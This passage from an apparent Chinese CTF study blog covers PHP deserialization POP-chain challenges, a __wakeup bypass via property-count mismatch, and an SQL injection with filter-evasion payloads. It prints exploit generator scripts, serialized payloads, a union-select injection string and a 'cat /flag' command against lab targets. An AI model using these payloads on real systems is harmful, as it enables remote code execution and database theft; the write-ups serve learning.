language_">$this</span>-&gt;doing-&gt;better;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 定义tommoraw类</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$good</span>;   <span class="hljs-comment">// 公共属性good</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$bad</span>;    <span class="hljs-comment">// 公共属性bad</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$soso</span>;   <span class="hljs-comment">// 公共属性soso</span><br><br>        <span class="hljs-comment">// 魔术方法：当对象被当作函数调用时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;good=<span class="hljs-string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;good;<br>        &#125;<br><br>        <span class="hljs-comment">// 魔术方法：当访问不存在的属性时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bad=<span class="hljs-string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 定义future类</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$impossible</span>=<span class="hljs-string">&quot;How can you get here?&lt;br&gt;&quot;</span>;  <span class="hljs-comment">// 私有属性impossible</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$out</span>;     <span class="hljs-comment">// 私有属性out</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$no</span>;      <span class="hljs-comment">// 私有属性no</span><br>        <span class="hljs-comment">// 多个公共属性</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$useful1</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful2</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful3</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful4</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful5</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful6</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful7</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful8</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful9</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful10</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful11</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful12</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful13</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful14</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful15</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful16</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful17</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful18</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful19</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful20</span>;<br><br>        <span class="hljs-comment">// 魔术方法：当给不存在的属性赋值时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>            <span class="hljs-comment">// 检查out对象的useful7属性是否存在</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;out-&gt;useful7) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;<br>                <span class="hljs-comment">// 执行系统命令whoami</span><br>                <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 魔术方法：当对象被当作字符串使用时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your future.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-comment">// 执行POST参数wow指定的系统命令</span><br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wow&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;win&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 析构函数</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;no = <span class="hljs-string">&quot;no&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;no;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 检查filename参数指定的文件是否存在</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 如果文件不存在，去掉filename参数最后4个字符</span><br>        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>);<br>        <span class="hljs-comment">// 对处理后的数据进行5次base64解码后反序列化</span><br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">best64_decode</span>(<span class="hljs-variable">$data</span>));<br>    &#125;<br><br>    <span class="hljs-comment">// 注释提示：你昨天学习，今天选择，能到达你的未来吗？</span><br>    <span class="hljs-comment">// You learn yesterday, you choose today, can you get to your future?</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>给d导解析了一下，没直接给出能用的payload，但是思路看了一下应该没问题，先调用yesterday 里的__destruct，里面调用了一个hard方法，对应today的_call，然后是当md5调用类时会将其当成字符串调用，对应future里的_toString，然后_toString里直传参wow即可  </p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span></span>&#123;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> yesterday;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> today;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> tommoraw;<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> future;<br><br><span class="hljs-comment">// 正确的属性赋值方式</span><br><span class="hljs-variable">$a</span>-&gt;study = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;doing=<span class="hljs-variable">$d</span>;<br><br><span class="hljs-comment">// 先序列化，再多层base64编码</span><br><span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$p</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$serialized</span>)))));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$p</span>.<span class="hljs-string">&#x27;aaaa&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后再post里传wow来运行即可<br>wow&#x3D;cat &#x2F;flag;</p><hr><h2 id="title-note-nssctf-01date-2025-03-17-22-01-05tags-nssctf"><a href="#title-note-nssctf-01date-2025-03-17-22-01-05tags-nssctf" class="headerlink" title="title: note-nssctf-01date: 2025-03-17 22:01:05tags: nssctf"></a>title: note-nssctf-01<br>date: 2025-03-17 22:01:05<br>tags: nssctf</h2><h1 id="SWPUCTF-2022-新生赛-ez-sql"><a href="#SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_sql"></a>[SWPUCTF 2022 新生赛]ez_sql</h1><p>题目说参数为nss，get传nss&#x3D;1<br>提示要用更安全的传参法，那就post了<br>post:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">nss=<span class="hljs-number">1</span><span class="hljs-string">&#x27;  //报错</span><br><span class="hljs-string">nss=1&#x27;</span><span class="hljs-comment">#  //成功闭合</span><br></code></pre></td></tr></table></figure><p>用联合注入发现被过滤了union，空格<br>双写绕过即可<br>爆字段payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">nss=<span class="hljs-string">&#x27; uunionnion/**/select/**/1,database(),group_concat(column_name)from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;</span>NSS_tb<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>到这步就差不多了</p><hr><h2 id="title-note-反序列化-00date-2025-03-18-22-36-05tags"><a href="#title-note-反序列化-00date-2025-03-18-22-36-05tags" class="headerlink" title="title: note-反序列化-00date: 2025-03-18 22:36:05tags: "></a>title: note-反序列化-00<br>date: 2025-03-18 22:36:05<br>tags: </h2><h1 id="java反序列化notice"><a href="#java反序列化notice" class="headerlink" title="java反序列化notice"></a>java反序列化notice</h1><p>现在理解的反序列大概就是传入一串字符，经java的处理变成能执行的语句，实现rec  </p><blockquote><p>序列化指的是将对象或数据结构转换为可存储或传输的格式的过程，实现的方法是writeObject()；反序列化则反之，实现的方法是readObject()，可以简单地理解为将文件压缩和解压缩的过程。</p></blockquote><blockquote><p>与PHP中反序列互相触发魔法函数导致的漏洞成因不同，java反序列化漏洞的成因主要是由于java序列化和反序列化机制的设计特点所致，简单地讲，只要反序列化代码中含有危险的命令代码，且该代码的参数是可控的，那它就存在该漏洞。</p></blockquote><blockquote><p>漏洞原理在我今天这里不是重要的，我主要想记录的是该漏洞的利用方式。</p></blockquote><blockquote><p>通常在解题中如果你看到一段字符串以rO0AB开头，那它是java序列化后base64编码的数据；如果一段字符串以aced开头，那它是java序列化后十六进制的数据，碰到这两种情况都基本可以认定该题考点为java反序列化漏洞，如果有直接接受该字符串的输入点，就可以尝试用链子直接打。</p></blockquote><blockquote><p>原文链接：<a href="https://blog.csdn.net/m0_64893612/article/details/136378608">https://blog.csdn.net/m0_64893612/article/details/136378608</a></p></blockquote><h2 id="SWPUCTF-2021-新生赛-no-wakeup-学习笔记："><a href="#SWPUCTF-2021-新生赛-no-wakeup-学习笔记：" class="headerlink" title="[SWPUCTF 2021 新生赛]no_wakeup 学习笔记："></a>[SWPUCTF 2021 新生赛]no_wakeup 学习笔记：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br>```  <br>  <br></code></pre></td></tr></table></figure><p>大概是get一个p参数，传给$Letmeseesee然后反序列化，可能p经过反序列化后会变成一个名为this的变量，里面包含有{admin,passwd},其中passwd经过sha1计算再赋值给原来的passwd，当this里的admin&#x3D;&#x3D;&#x3D;admin，经过sha1计算的passwd&#x3D;&#x3D;&#x3D;wllm时就会输出flag</p><p>KIMI：</p><blockquote><p>你的审计思路基本正确，但有一些细节需要澄清：<br>反序列化后的对象状态：<br>当用户传入的p参数被反序列化后，如果它是一个HaHaHa类的对象，那么__wakeup()方法会被调用，此时$passwd的值会被更新为sha1($passwd)。<br>因此，$passwd的值在反序列化后会被哈希处理，而不是直接使用传入的值。<br>条件判断：<br>在析构方法中，判断条件是$admin &#x3D;&#x3D;&#x3D; “admin”且$passwd &#x3D;&#x3D;&#x3D; “wllm”。<br>因此，攻击者需要构造一个对象，使得反序列化后$admin为”admin”，并且$passwd在经过sha1()哈希后等于”wllm”。  </p></blockquote><p>然而怎么可能会有在经过sha1处理后的到wllm的值。<br>所以要绕过这个__wakeup()</p><p><strong>__wakeup() 的作用</strong><br>反序列化时的初始化：<br>当一个对象被序列化后，其状态会被保存为字符串。在反序列化时，对象的状态会被恢复，但某些资源（如数据库连接）可能无法直接序列化，因此需要在反序列化后重新初始化这些资源。<br>__wakeup() 方法正是为此设计的，它允许你在对象恢复后执行一些必要的操作。<br>数据处理：<br>在反序列化后，你可能需要对对象的某些属性进行处理。例如，对敏感数据进行解密，或者对某些属性进行格式转换。</p><p>所以大概就是当触发反序列化时__wakeup就会调用这个sha1.</p><p>网上正确的payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">?p=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>学习notice：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>：表示这是一个对象（Object）。  <br><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>：表示这是一个类名为HaHaHa的对象，类名长度为<span class="hljs-number">6</span>。  <br><span class="hljs-attribute">3</span>：表示对象有<span class="hljs-number">3</span>个属性。  <br><span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;：第一个属性名为admin，值为admin。  <br><span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;：第二个属性名为passwd，值为wllm。  <br></code></pre></td></tr></table></figure><p>这个payload能够绕过__wakeup()方法的原因可能与PHP反序列化过程中的一些特性或漏洞有关，比如属性个数不匹配（CVE-2016-7124）。<br>在这个漏洞中，如果序列化字符串中指定的属性个数比实际类中定义的属性个数多，PHP在反序列化时可能会绕过__wakeup()方法的执行。</p><p><strong>绕过原理</strong><br>由于修改了属性个数，PHP在反序列化时会跳过__wakeup()方法的执行。因此，passwd属性的值不会被SHA-1哈希处理，而是直接保留为wllm。当对象被销毁时，__destruct()方法会检查admin和passwd的值，发现它们满足条件，从而包含flag.php并输出flag。<br>通过这种方式，攻击者成功绕过了__wakeup()方法，直接设置了所需的属性值，触发了敏感文件的包含。</p><p>我的理解就是：<br>构造一个被java序列化后的数值来满足条件，并且使用定义与实际的的属性个数不同来绕过wakeup(),因为wakeup根本就是不想让你过的</p><p>O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:10:”wllm”;}<br>其中s是字符串长度，2代表里面有两个元素：admin&#x3D;admin，passwd&#x3D;wllm。<br>吧2改成其它超过实际元素的值即可绕过wakeup()<br>就是要大过2，不知道为什么不能小于2</p><hr><h2 id="title-note-反序列化-01date-2025-03-19-18-49-19tags"><a href="#title-note-反序列化-01date-2025-03-19-18-49-19tags" class="headerlink" title="title: note-反序列化-01date: 2025-03-19 18:49:19tags:"></a>title: note-反序列化-01<br>date: 2025-03-19 18:49:19<br>tags:</h2><p>pop链，我也不知道是什么</p><blockquote><p>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的一种payload，实战应用范围暂时没遇到，不过在CTF比赛中经常出现这样的题目，同时也经常与反序列化一起考察，可以理解为是反序列化的一种拓展，泛用性更强，涉及到的魔法方法也更多。  </p></blockquote><h1 id="SWPUCTF-2021-新生赛-pop-1"><a href="#SWPUCTF-2021-新生赛-pop-1" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><p>我想tag可以有：pop链，反序列化<br>原题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$w00m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w00m&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$w00m</span>);<br></code></pre></td></tr></table></figure><p>学了大佬的wp <a href="https://blog.csdn.net/u010723806/article/details/142340216">https://blog.csdn.net/u010723806/article/details/142340216</a><br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看完后应该是因为只能传w00m的值，而w44m中无法直接传入，要通过一场串相互关联的类才能传入，这大概就是pop链吧  </p><p>先是 w22m 和 w33m 都能传入w00m，</p><blockquote><p>$this-&gt;w00m-&gt;{$this-&gt;w22m}(); 最终的效果是动态调用 $this-&gt;w00m 对象中的一个方法，方法的名称由 $this-&gt;w22m 决定。而 这条语句的意思就是调用了在w33m里的w00m属性（这里是w00m类）中的w22m方法。</p></blockquote><h2 id="为什么先赋值-w22m"><a href="#为什么先赋值-w22m" class="headerlink" title="为什么先赋值 w22m  "></a><strong>为什么先赋值 w22m</strong>  </h2><p><strong>利用 w22m 的 __destruct 方法：</strong><br>w22m 类的 __destruct 方法会输出 $this-&gt;w00m。<br>当 PHP 脚本结束时，或者当对象被销毁时，__destruct 方法会被自动调用。<br>这意味着，当我们反序列化一个 w22m 对象时，__destruct 方法会立即执行，从而触发后续的操作。  </p><p><strong>触发 w33m 的 __toString 方法：</strong><br>w22m 的 __destruct 方法输出 $this-&gt;w00m，而 $this-&gt;w00m 是一个 w33m 对象。<br>当 PHP 需要将一个对象转换为字符串时（例如在 echo 中），会自动调用该对象的 __toString 方法。<br>因此，w33m 的 __toString 方法会被调用。    </p><p><strong>调用 w44m 的 Getflag 方法：</strong><br>w33m 的 __toString 方法中，$this-&gt;w00m-&gt;{$this-&gt;w22m}() 会被执行。<br>这里的 $this-&gt;w00m 是一个 w44m 对象，而 $this-&gt;w22m 是字符串 